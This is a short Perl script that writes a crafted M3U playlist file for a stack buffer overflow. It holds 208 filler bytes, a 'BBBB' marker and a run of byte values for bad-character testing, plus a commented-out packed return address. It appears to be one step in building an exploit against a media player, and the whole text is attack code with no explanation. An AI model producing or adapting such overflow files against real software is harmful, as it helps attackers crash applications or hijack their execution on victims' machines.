$file= "characcept.m3u";

$buffer ="A" x 208;
#$buffer .= pack('V',0x7E429353);
$buffer .="BBBB";
for (my $i = 10; $i <= 99; $i++) {
   $buffer .= chr($i);
}


open($FILE,">$file");
print $FILE $buffer;
close($FILE);
